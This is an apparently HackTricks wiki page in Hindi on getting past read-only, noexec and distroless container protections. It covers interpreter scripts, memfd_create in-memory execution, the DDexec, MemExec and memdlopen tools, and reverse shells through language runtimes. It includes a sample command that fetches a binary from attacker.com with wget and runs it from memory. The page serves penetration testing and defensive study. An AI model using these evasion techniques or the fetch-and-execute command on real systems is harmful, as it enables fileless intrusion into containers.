# FS protections को bypass करना: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

निम्नलिखित videos में इस page पर बताई गई techniques को और विस्तार से समझाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Stealth और Evasion के लिए Linux Memory Manipulation की पड़ताल**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**DDexec-ng और in-memory dlopen() के साथ Stealth intrusions - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec स्थिति

Container में security context में **`readOnlyRootFilesystem: true`** सेट करके root filesystem को read-only mount किया जा सकता है।<sup>[[3]](#references)</sup> उदाहरण के लिए:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root होने से अलग से mount किए गए volumes read-only नहीं हो जाते। Docker **`/dev/shm`** को IPC mount मानता है, जबकि `rw` और `noexec` जैसे tmpfs options runtime configuration के विकल्प हैं; इनमें से किसी भी व्यवहार पर निर्भर होने से पहले target container के mount options की जाँच करें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Red-team के नज़रिए से, इस combination के कारण ऐसे binaries को download और execute करना मुश्किल हो सकता है जो पहले से उपलब्ध नहीं हैं (उदाहरण के लिए, backdoors या enumeration tools)।<sup>[[4]](#references)[[5]](#references)</sup>

## सबसे आसान bypass: Scripts

`noexec` mount उस mount पर मौजूद binaries को सीधे execute होने से रोकता है, लेकिन interpreter किसी script को पढ़कर interpret कर सकता है। इसलिए, अगर `sh` या `python` मौजूद है, तो उस interpreter के ज़रिए shell या Python script चला सकते हैं।<sup>[[5]](#references)</sup>

अगर ज़रूरी tool खुद एक binary है, तो यह तरीका मददगार नहीं होगा।<sup>[[5]](#references)</sup>

## Memory Bypasses

जब mounted path से सीधे execution blocked हो, तो एक विकल्प ELF को memory में load करके in-memory path के ज़रिए execute करना है। इससे उस mount का `noexec` check bypass हो जाता है, लेकिन kernel, permissions या policy के अन्य controls नहीं हटते।<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

अगर scripting runtime संबंधित Linux interface को access कर सकता है, तो वह **`memfd_create(2)`** के ज़रिए एक anonymous, RAM-backed file descriptor बना सकता है, उसमें ELF bytes लिख सकता है और fd-backed execution path का इस्तेमाल कर सकता है। [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project इस workflow के लिए compressed और base64-encoded Python, Perl या Ruby code बनाता है।<sup>[[6]](#references)[[7]](#references)</sup>

Project फिलहाल Python, Perl और Ruby targets के बारे में documentation देता है; PHP या Node के लिए runtime-specific कोई अलग technique या extension चाहिए। इसलिए, किसी language के लिए इस generator का न होना यह नहीं दर्शाता कि in-memory execution असंभव है।<sup>[[6]](#references)[[12]](#references)</sup>

Anonymous-file execution, संबंधित staging patterns और detection तथा forensic collection के व्यापक विवरण के लिए [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) देखें।

> [!WARNING]
> **`/dev/shm`** में लिखी गई सामान्य executable file पर उस mount की **`noexec`** setting लागू रहती है; उसे सामान्य file descriptor के ज़रिए खोलने मात्र से mount policy नहीं बदलती।<sup>[[5]](#references)</sup>
>
> Memory-execution की सटीक विधि runtime, architecture, kernel और उपलब्ध permissions पर भी निर्भर करती है।<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) **`/proc/self/mem`** के ज़रिए running shell process में stager और loader लिखता है, फिर control उस code को सौंपता है।<sup>[[8]](#references)</sup>

इससे process किसी supplied binary को executable filesystem पर पहले रखे बिना load कर सकता है।<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** memory से shellcode या binary को load और **execute** कर सकता है।<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

इस technique के बारे में अधिक जानकारी के लिए Github देखें या:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) एक daemonized DDexec implementation है। इसका daemon arguments और raw program bytes वाले requests को सुनता है, हर program को load और run करने के लिए एक child fork करता है, और parent को server के रूप में बनाए रखता है।<sup>[[9]](#references)</sup>

Repository में [a.php](https://github.com/arget13/memexec/blob/main/a.php) में **PHP reverse shell से binaries execute करने के लिए memexec का उपयोग करने** का एक उदाहरण शामिल है।<sup>[[9]](#references)</sup>

### Memdlopen

DDexec जैसे ही उद्देश्य वाला [**memdlopen**](https://github.com/arget13/memdlopen), shared object या program के लिए एक fileless `dlopen()` implementation है। इसका README फिलहाल ARM64 support दस्तावेज़ित करता है, इसलिए इसका उपयोग करने से पहले target architecture जाँच लें।<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless असल में क्या है**, यह कब मददगार होता है, कब नहीं, और यह containers में post-exploitation tradecraft को कैसे बदलता है, इसकी विस्तृत व्याख्या के लिए देखें:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless images में केवल application और उसकी runtime dependencies होती हैं; official images में package managers, shells और standard Linux distribution में अपेक्षित अन्य programs शामिल नहीं होते।<sup>[[11]](#references)</sup>

Runtime image को इन dependencies तक सीमित रखने से production में मौजूद software और scan तथा track किए जाने वाले software की मात्रा कम हो जाती है।<sup>[[11]](#references)</sup>

### Reverse Shell

Distroless container में सामान्य shell के लिए **`sh` या `bash` नहीं मिल सकता**, और न ही `ls`, `whoami` या `id` जैसी आम utilities मिल सकती हैं।<sup>[[11]](#references)</sup>

> [!WARNING]
> इसलिए, सामान्य shell-based reverse shell या utility-based enumeration काम नहीं कर सकता।<sup>[[11]](#references)</sup>

यदि compromised application में language runtime शामिल है (उदाहरण के लिए, Flask application के लिए Python या Node application के लिए Node.js), तो RCE अब भी command channel और उसके APIs के ज़रिए system inspection के लिए उस runtime का उपयोग कर सकता है।<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> अपनी language capabilities के ज़रिए **system enumerate** करने के लिए उपलब्ध scripting language का उपयोग करें।<sup>[[12]](#references)</sup>

यदि **read-only/no-exec** protections नहीं हैं, तो command channel किसी writable, executable mount पर binaries लिखकर उन्हें चला सकता है; पहले mount options और permissions जाँच लें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> जब ये protections मौजूद हों, तो जहाँ runtime, kernel और permissions अनुमति दें, वहाँ **ऊपर दी गई memory-execution techniques** का उपयोग करें।<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

[**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में RCE vulnerabilities का exploit करके scripting-language **reverse shells** प्राप्त करने और memory से binaries execute करने के **उदाहरण** मिल सकते हैं।<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Stealth और Evasion के लिए Linux Memory Manipulation की पड़ताल](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng और in-memory dlopen() के साथ Stealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod या Container के लिए Security Context configure करें](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
